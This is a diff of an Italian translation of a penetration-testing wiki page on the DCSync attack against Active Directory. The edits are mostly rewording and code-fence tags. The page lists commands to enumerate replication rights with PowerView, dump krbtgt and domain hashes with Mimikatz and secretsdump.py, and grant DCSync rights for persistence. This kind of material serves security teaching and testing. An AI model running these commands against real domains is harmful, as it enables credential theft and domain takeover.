@@ -9,21 +9,21 @@ Il permesso **DCSync** implica avere questi permessi sul dominio stesso: **DS-Re
 **Note Importanti su DCSync:**
 
 - L'**attacco DCSync simula il comportamento di un Domain Controller e chiede ad altri Domain Controller di replicare informazioni** utilizzando il Directory Replication Service Remote Protocol (MS-DRSR). Poiché MS-DRSR è una funzione valida e necessaria di Active Directory, non può essere disattivata o disabilitata.
-- Per impostazione predefinita solo i gruppi **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** hanno i privilegi richiesti.
+- Per impostazione predefinita, solo i gruppi **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** hanno i privilegi richiesti.
 - Se le password di qualsiasi account sono memorizzate con crittografia reversibile, è disponibile un'opzione in Mimikatz per restituire la password in chiaro.
 
-### Enumerazione
+### Enumeration
 
 Controlla chi ha questi permessi usando `powerview`:
-```powershell
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 ### Sfrutta Localmente
-```powershell
+```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
-### Sfrutta da Remoto
-```powershell
+### Sfruttare Remotamente
+```bash
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
@@ -35,18 +35,18 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 - uno con le **chiavi Kerberos**
 - uno con le password in chiaro dall'NTDS per qualsiasi account impostato con [**cifratura reversibile**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) abilitata. Puoi ottenere gli utenti con cifratura reversibile con
 
-```powershell
+```bash
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 ```
 
 ### Persistenza
 
 Se sei un amministratore di dominio, puoi concedere queste autorizzazioni a qualsiasi utente con l'aiuto di `powerview`:
-```powershell
+```bash
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-Quindi, puoi **verificare se all'utente sono stati assegnati correttamente** i 3 privilegi cercandoli nell'output di (dovresti essere in grado di vedere i nomi dei privilegi all'interno del campo "ObjectType"):
-```powershell
+Poi, puoi **verificare se all'utente sono stati assegnati correttamente** i 3 privilegi cercandoli nell'output di (dovresti essere in grado di vedere i nomi dei privilegi all'interno del campo "ObjectType"):
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 ### Mitigazione
